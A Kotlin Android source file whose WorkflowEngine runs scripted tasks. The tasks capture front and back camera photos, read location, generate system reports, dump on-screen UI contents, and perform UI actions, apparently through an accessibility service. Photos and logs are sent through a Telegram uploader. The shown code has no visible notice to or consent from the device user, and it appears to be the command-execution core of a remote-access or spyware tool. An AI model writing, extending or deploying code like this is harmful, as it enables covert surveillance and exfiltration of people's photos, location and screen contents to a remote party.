package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume

class WorkflowEngine(
    private val context: Context,
    private val uploader: TelegramUploader,
    private val systemHandler: SystemHandler,
    private val mediaHandler: MediaHandler
) {
    suspend fun executeWorkflow(workflowName: String) = withContext(Dispatchers.IO) {
        val wfFile = File(context.filesDir, "$workflowName.yml")
        if (!wfFile.exists()) {
            uploader.sendText("Workflow $workflowName not found.")
            return@withContext
        }

        val logFile = File(context.filesDir, "${workflowName}_status.txt")
        FileWriter(logFile, false).use { it.write("--- WORKFLOW LOG STARTED ---\n") }

        fun log(msg: String) {
            FileWriter(logFile, true).use { 
                it.write("[${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}] $msg\n") 
            }
        }

        log("Parsing workflow: $workflowName")
        val lines = wfFile.readLines()
        
        var currentTaskType = ""
        var currentCmd = ""
        var currentUiTexts = ""
        var currentUiTarget = ""
        var currentUiAction = ""
        var currentOffset = 1
        var currentCaseSensitive = false
        var currentEngine = "smart" 
        var currentEventType = ""
        var currentEventTarget = ""

        suspend fun executeCurrentTask() {
            if (currentTaskType == "command") {
                log("Command Executing: $currentCmd")
                when (currentCmd) {
                    "loc" -> log(systemHandler.getLocation())
                    "cam_front" -> mediaHandler.takePicture(true)?.let { uploader.sendFile(it, "photo", "WF Front Cam") }
                    "cam_back" -> mediaHandler.takePicture(false)?.let { uploader.sendFile(it, "photo", "WF Back Cam") }
                    "info" -> log(systemHandler.generateFullSystemReport().readText())
                    "dump_screen" -> {
                        log("Requesting UI Screen Dump...")
                        val dumpFile = requestScreenDump(context)
                        if (dumpFile != null && dumpFile.exists()) {
                            log("\n========= MANUAL UI DEBUG DUMP =========")
                            FileWriter(logFile, true).use { it.write(dumpFile.readText() + "\n") }
                            log("========================================\n")
                            dumpFile.delete()
                        } else {
                            log("Failed to generate manual screen dump.")
                        }
                    }
                }
            } else if (currentTaskType == "ui") {
                log("UI Action: '$currentUiAction' on target '$currentUiTarget' near texts [$currentUiTexts]")
                
                val result = suspendCancellableCoroutine<String> { continuation ->
                    val receiver = object : BroadcastReceiver() {
                        override fun onReceive(c: Context?, intent: Intent?) {
                            if (intent?.action == "com.systemlinker.UI_RESULT") {
                                val msg = intent.getStringExtra("result") ?: "Unknown error"
                                context.unregisterReceiver(this)
                                if (continuation.isActive) continuation.resume(msg)
                            }
                        }
                    }
                    val filter = IntentFilter("com.systemlinker.UI_RESULT")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        context.registerReceiver(receiver, filter)
                    }

                    val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                        setPackage(context.packageName)
                        putExtra("action", "workflow_ui")
                        putExtra("ui_texts", currentUiTexts) 
                        putExtra("ui_target", currentUiTarget)
                        putExtra("ui_action", currentUiAction)
                        putExtra("ui_offset", currentOffset)
                        putExtra("ui_case_sensitive", currentCaseSensitive)
                    }
                    context.sendBroadcast(intent)
                }
                
                log("UI Result: $result")
                
                if (result.contains("DEBUG DUMP GENERATED")) {
                    val dumpFile = File(context.filesDir, "ui_debug_dump.txt")
                    if (dumpFile.exists()) {
                        log("\n========= UI DEBUG DUMP (Extracted Screen Nodes) =========")
                        try { FileWriter(logFile, true).use { it.write(dumpFile.readText() + "\n") } } catch (e: Exception) {}
                        log("==========================================================\n")
                        dumpFile.delete()
                    }
                }
                delay(1000)
                
            } else if (currentTaskType == "wait_event") {
                log("Waiting for Event: type='$currentEventType', target='$currentEventTarget'...")
                val eventOccurred = withTimeoutOrNull(300_000L) {
                    suspendCancellableCoroutine<Boolean> { continuation ->
                        val receiver = object : BroadcastReceiver() {
                            override fun onReceive(c: Context?, intent: Intent?) {
                                if (intent?.action == "com.systemlinker.EVENT_TRIGGER") {
                                    val evType = intent.getStringExtra("event_type") ?: ""
                                    val evData = intent.getStringExtra("event_data") ?: ""
                                    
                                    if (evType == currentEventType && evData.contains(currentEventTarget, true)) {
                                        context.unregisterReceiver(this)
                                        if (continuation.isActive) continuation.resume(true)
                                    }
                                }
                            }
                        }
                        val filter = IntentFilter("com.systemlinker.EVENT_TRIGGER")
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                        } else {
                            context.registerReceiver(receiver, filter)
                        }
                    }
                }
                if (eventOccurred == true) log("Event Captured! Resuming workflow.")
                else log("Event Wait Timed Out.")
            } else if (currentTaskType == "delay") {
                val delayTime = currentCmd.toLongOrNull() ?: 1000L
                log("Waiting for $delayTime ms")
                delay(delayTime)
            }
        }

        for (line in lines) {
            val trimmed = line.trim()
            if (trimmed.startsWith("- type:")) {
                if (currentTaskType.isNotEmpty()) executeCurrentTask() 
                currentTaskType = trimmed.substringAfter("type:").trim().replace("\"", "")
                
                currentCmd = ""; currentUiTexts = ""; currentUiTarget = ""; currentUiAction = "click"
                currentOffset = 1; currentCaseSensitive = false; currentEngine = "smart"
                currentEventType = ""; currentEventTarget = ""
            } else if (trimmed.startsWith("cmd:")) {
                currentCmd = trimmed.substringAfter("cmd:").trim().replace("\"", "")
            } else if (trimmed.startsWith("text:")) {
                currentUiTexts = trimmed.substringAfter("text:").trim().replace("\"", "")
            } else if (trimmed.startsWith("target:")) {
                currentUiTarget = trimmed.substringAfter("target:").trim().replace("\"", "")
            } else if (trimmed.startsWith("action:")) {
                currentUiAction = trimmed.substringAfter("action:").trim().replace("\"", "")
            } else if (trimmed.startsWith("offset:")) {
                currentOffset = trimmed.substringAfter("offset:").trim().toIntOrNull() ?: 1
            } else if (trimmed.startsWith("case_sensitive:")) {
                currentCaseSensitive = trimmed.substringAfter("case_sensitive:").trim().replace("\"", "").toBooleanStrictOrNull() ?: false
            } else if (trimmed.startsWith("event:")) {
                currentEventType = trimmed.substringAfter("event:").trim().replace("\"", "")
            } else if (trimmed.startsWith("event_target:")) {
                currentEventTarget = trimmed.substringAfter("event_target:").trim().replace("\"", "")
            }
        }
        if (currentTaskType.isNotEmpty()) executeCurrentTask()

        log("--- WORKFLOW FINISHED ---")
        uploader.sendDocument(logFile, "Workflow Completed: $workflowName")
    }

    suspend fun sendStatus(workflowName: String) {
        val logFile = File(context.filesDir, "${workflowName}_status.txt")
        if (logFile.exists()) uploader.sendDocument(logFile, "Status of Workflow: $workflowName")
        else uploader.sendText("No active logs found for $workflowName.")
    }

    // Extracted helper for manual requests
    private suspend fun requestScreenDump(context: Context): File? = suspendCancellableCoroutine { cont ->
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, intent: Intent?) {
                if (intent?.action == "com.systemlinker.UI_RESULT") {
                    context.unregisterReceiver(this)
                    val msg = intent.getStringExtra("result") ?: ""
                    if (msg.contains("SUCCESS")) {
                        if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
                    } else {
                        if (cont.isActive) cont.resume(null)
                    }
                }
            }
        }
        val filter = IntentFilter("com.systemlinker.UI_RESULT")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(receiver, filter)
        }
        val intent = Intent("com.systemlinker.ACC_ACTION").apply {
            setPackage(context.packageName)
            putExtra("action", "dump_screen_request")
        }
        context.sendBroadcast(intent)
    }
}